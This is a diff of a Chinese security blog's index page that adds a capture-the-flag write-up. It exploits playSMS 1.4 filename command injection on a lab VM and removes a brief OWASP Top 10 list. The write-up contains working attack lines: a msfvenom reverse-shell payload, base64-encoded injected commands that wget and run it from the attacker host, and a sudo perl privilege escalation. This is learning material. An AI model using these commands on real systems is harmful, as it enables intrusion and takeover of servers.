@@ -160,6 +160,81 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-GetFlag-命令注入" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/05/11/GetFlag-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/">GetFlag-命令注入</a>
+    </h1>
+  
+
+        
+        <a href="/2020/05/11/GetFlag-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/" class="archive-article-date">
+  	<time datetime="2020-05-10T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-05-11</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><strong>0x00前言</strong><br>&emsp;&emsp;本文是第八篇，介绍了通过命令注入获得root权限的过程，涉及知识点：工具nikto、dirb以及nmap的使用、metasploit监听反弹shell、编码绕过防火墙等。关于靶场，玩法不一，以下只是本人的一次学习过程，不喜勿喷。<br><strong>0x01环境</strong><br>&emsp;&emsp;攻击机(kali)：192.168.3.107<br>&emsp;&emsp;靶机(Ubuntu)：192.168.3.102<br><strong>0x02工具</strong><br>&emsp;&emsp;nmap、nikto、dirb、metasploit、burpsuite、VMware、VirtualBox<br><strong>0x03过程</strong><br>&emsp;&emsp;<strong>信息探测</strong><br>&emsp;&emsp;终端下输入<code>nmap -T4 -A -p- 192.168.3.102</code><br>&emsp;&emsp;探测结果为<br>&emsp;&emsp;&emsp;&emsp;开放端口： 80(http)<br>&emsp;&emsp;&emsp;&emsp;Web容器信息：Apache httpd 2.2.22<br>&emsp;&emsp;&emsp;&emsp;系统信息：Ubuntu<br>&emsp;&emsp;针对开放http服务的80端口，进一步探测敏感信息<br>&emsp;&emsp;终端下输入<code>nikto -host http://192.168.3.102</code><br>&emsp;&emsp;输入<code>dirb http://192.168.3.102</code><br>&emsp;&emsp;扫描结果：<br>&emsp;&emsp;目录：<code>/ange1/</code>、<code>/icons/</code>、<code>/tmp/</code>、<code>/secure/</code>、<code>/uploads/</code>、<code>robots.txt</code><br>&emsp;&emsp;<strong>深入挖掘</strong><br>&emsp;&emsp;打开浏览器访问靶机<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%871.png" alt=""><br>&emsp;&emsp;点击提交查询，页面好像跳转到靶机作者的博客。<br>&emsp;&emsp;访问robots.txt<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%872.png" alt=""><br>&emsp;&emsp;逐个访问，发现：出了noting是一个404页面，其他都为空目录<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%873.png" alt=""><br>&emsp;&emsp;但是这个nothing页面的404似乎和平常的404不太一样，查看页面源码<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%874.png" alt=""><br>&emsp;&emsp;找到一些密码信息，可能之后会用得到<br>&emsp;&emsp;访问/secure/目录<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%875.png" alt=""><br>&emsp;&emsp;猜测是这备份文件，下载并进行解压<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%876.png" alt=""><br>&emsp;&emsp;尝试逐个输入之前的密码<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%877.png" alt=""><br>&emsp;&emsp;在kali中解压出现了点问题无法成功解压，这里是放到windows解压后再复制到kali<br>&emsp;&emsp;查看文件属性<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%878.png" alt=""><br>&emsp;&emsp;文本内容文件，查看内容<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%879.png" alt=""><br>&emsp;&emsp;得到一些提示信息、一个用户名以及一个登录的url<br>&emsp;&emsp;访问url<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%8710.png" alt=""><br>&emsp;&emsp;输入用户名touhid，同样尝试输入之前的密码<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%8711.png" alt=""><br>&emsp;&emsp;成功登录，密码为diana<br>&emsp;&emsp;确认这是playSMS，在漏洞库进行搜索<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%8712.png" alt=""><br>&emsp;&emsp;找到1.4版本的命令注入漏洞exp<br>&emsp;&emsp;输入命令<code>cat /usr/share/exploitdb/exploits/php/webapps/42003.txt</code>查看exp<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%8713.png" alt=""><br>&emsp;&emsp;大意是在文件名使用带有系统命令的payload可实现命令注入<br>&emsp;&emsp;详细信息可参考<a href="https://www.dazhuanlan.com/2019/10/19/5daaad9215717/" target="_blank" rel="noopener">https://www.dazhuanlan.com/2019/10/19/5daaad9215717/</a><br>&emsp;&emsp;访问漏洞存在位置<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%8714.png" alt=""><br>&emsp;&emsp;文件上传，且应该上传csv文件<br>&emsp;&emsp;在桌面生成一个1.csv文件，上传并抓包，修改文件名<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%8715.png" alt=""><br>&emsp;&emsp;命令被成功执行，并回显结果，再次修改payload<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%8716.png" alt=""><br>&emsp;&emsp;页面需要重定向，需要重新抓包，查看id<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%8717.png" alt=""><br>&emsp;&emsp;同样输出结果<br>&emsp;&emsp;<strong>漏洞利用</strong><br>&emsp;&emsp;上传并执行木马的文件思路：生成木马文件，打开监听，在漏洞处利用系统命令wget，先到远程http服务器下载木马文件，然后利用系统命令赋予权限并执行该文件，监听端返回shell。<br>&emsp;&emsp;这里使用kali上的apache服务，用msfvenom生成linux木马文件，用msf控制台进行监听。<br>&emsp;&emsp;输入命令<br>&emsp;&emsp;<code>msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.3.107 lport=4444 -f elf &gt;/var/www/html/shell</code><br>&emsp;&emsp;生成shell文件<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%8718.png" alt=""><br>&emsp;&emsp;输入命令<code>service apache2 start</code>启动apache服务<br>&emsp;&emsp;打开msf控制台监听，并进行相应设置<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%8719.png" alt=""><br>&emsp;&emsp;启动监听<br>&emsp;&emsp;根据思路，需要用到以下命令(这里需注意单引号)<br>&emsp;&emsp;<code>echo &#39;wget http://192.168.3.107/shell -O /tmp/shell&#39; |base64</code><br>&emsp;&emsp;<code>echo &#39;chmod 777 /tmp/shell&#39; |base64</code><br>&emsp;&emsp;<code>echo &#39;/tmp/shell&#39; |base64</code><br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%8720.png" alt=""><br>&emsp;&emsp;由于靶机开启了防火墙，这里使用base64编码进行绕过<br>&emsp;&emsp;这是回到漏洞处，将base64编码的结果放到payload并需要进行base64_decode<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%8721.png" alt=""><br>&emsp;&emsp;依次注入三条命令<br>&emsp;&emsp;最后一个数据包放完之后<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%8722.png" alt=""><br>&emsp;&emsp;成功返回控制通道，打开shell<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%8723.png" alt=""><br>&emsp;&emsp;输入<code>sudo -l</code>命令查看可执行root权限的命令，发现perl程序<br>&emsp;&emsp;可使用perl脚本命令<code>perl -e “exec ‘/bin/sh’”</code>以及<code>bash -i</code>进行提权<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%8724.png" alt=""><br>&emsp;&emsp;成功提权，查看Flag<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%8725.png" alt=""><br>&emsp;&emsp;成功获得Flag<br><strong>0x04总结</strong><br>&emsp;&emsp;在做CTF时，需要足够细心以及敏感，对一些关键词或者线索秉持”宁可错杀，不可放过”的态度。<br>&emsp;&emsp;此次渗透如果没有发现/nothing/的玄机以及backup.cred.mp3的伪装，就无法继续。获取到站点指纹信息后可在漏洞库进行检索，查看是否存在EXP。在漏洞利用过程，使用的是建立http服务器并放置一个shell木马脚本，让站点通过系统命令下载并执行，成功反弹shell，后用perl脚本命令进行提权，期间使用了base64编码实现了对防火墙的绕过。<br>&emsp;&emsp;加深了对在CTF中对敏感关键字词的印象，了解了绕防火墙第一思路：编码绕过，颇有收获。</p>
+<p><br><br><br><br><font face="Georgia" color=#c4444>防火墙不好绕。</font><br>作者：WebDogC</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">复现、CTF、study、flag、命令执行</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2020/05/11/GetFlag-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-GETFlag-命令执行" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -862,82 +937,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2020/04/16/%E7%BB%95WAF/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-OWASP TOP 10" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/04/15/OWASP%20TOP%2010/">WASP TOP 10(2017)</a>
-    </h1>
-  
-
-        
-        <a href="/2020/04/15/OWASP%20TOP%2010/" class="archive-article-date">
-  	<time datetime="2020-04-14T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-15</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><strong>A1 注入</strong><br><strong>A2 失效的身份认证</strong><br><strong>A3 敏感数据泄露</strong><br><strong>A4 XML外部处理器漏洞</strong><br><strong>A5 中断访问控制</strong><br><strong>A6 安全配置错误</strong><br><strong>A7 跨站脚本攻击</strong><br><strong>A8 不安全的反序列化</strong><br><strong>A9 使用有漏洞的组件</strong><br><strong>A10 不足的记录和监控</strong></p>
-<p><br><br><br><br><font face="Georgia" color=#c4444>当OWASP TOP 10消失时，网络安全将达到一个新高度。</font></p>
-<p>作者：WebDogC<br>参考文章 <a href="https://www.freebuf.com/articles/web/155145.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/155145.html</a></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">OWASP TOP 10、note、security</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/04/15/OWASP%20TOP%2010/">展开全文 >></a>
         </p>
       
 
